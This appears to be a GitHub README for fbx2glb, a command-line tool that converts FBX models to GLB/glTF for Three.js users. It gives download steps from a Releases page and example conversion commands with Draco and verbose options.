# 🚀 fbx2glb - Convert FBX Models Easily

## 📥 Download Now

[![Download fbx2glb](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Brmage23/fbx2glb/releases)

## 🚀 Getting Started

fbx2glb is a command-line tool designed for easy conversion of FBX models to glTF or GLB formats, aimed at Three.js and WebGL users. Whether you want to optimize 3D models or standardize your workflow, this tool is here to help. 

## 🎮 Features

- **FBX to GLB/GLTF Conversion:** Effortlessly convert your FBX files into the widely used GLB format.
- **Optimization Options:** Minimize file sizes for better performance in web applications.
- **Draco Compression:** Incorporate Draco compression to reduce the size of your 3D assets without losing quality.
- **Compatibility:** Works seamlessly with Three.js and WebGL for easy integration.

## 📦 System Requirements

Before downloading fbx2glb, ensure your system meets the following minimum requirements:

- **Operating System:** Windows, macOS, or Linux
- **Processor:** Dual-core processor or higher
- **Memory:** 4 GB RAM minimum
- **Disk Space:** At least 100 MB of free space for installation
- **Node.js:** Version 12 or higher for compatibility

## 🌐 Download & Install

To get started, visit our Releases page to download the latest version of fbx2glb.

[Download fbx2glb](https://github.com/Brmage23/fbx2glb/releases)

1. Click on the link above to go to the Releases page.
2. Choose the latest version of fbx2glb.
3. Download the file suitable for your operating system (e.g., .zip for Windows, .tar.gz for macOS/Linux).
4. Extract the downloaded file to a suitable location on your computer.

## ⚙️ Running fbx2glb

After you have installed fbx2glb, you can run it using the command line:

1. Open your command line interface (Terminal on macOS/Linux or Command Prompt/PowerShell on Windows).
2. Navigate to the directory where you extracted the files:
   - Use `cd path/to/fbx2glb` where "path/to/fbx2glb" is the location of the extracted files.
3. To convert an FBX file, use the following command:

```
fbx2glb input.fbx -o output.glb
```

Replace `input.fbx` with the path to your FBX file and `output.glb` with the desired name for the output file.

## 🎉 Example Usage

If you have an FBX file named `model.fbx` in the same directory, you can convert it to GLB by running:

```
fbx2glb model.fbx -o model.glb
```

This will generate a `model.glb` file in the same directory.

## 🎨 Additional Options

fbx2glb provides additional options for advanced users:

- **Compression:** Use the `--draco` flag for Draco compression:

```
fbx2glb input.fbx -o output.glb --draco
```

- **Verbose Output:** Add the `--verbose` flag for detailed logs during the conversion process:

```
fbx2glb input.fbx -o output.glb --verbose
```

## 📄 Documentation

For more detailed instructions, you can refer to the official documentation available in the repository.

## 💬 Support

If you encounter any issues or have questions, feel free to open an issue in the GitHub repository. Your feedback is valuable and helps improve fbx2glb.

## 🔗 Links

- [View on GitHub](https://github.com/Brmage23/fbx2glb)
- [Releases Page](https://github.com/Brmage23/fbx2glb/releases)

Enjoy converting your 3D models with fbx2glb!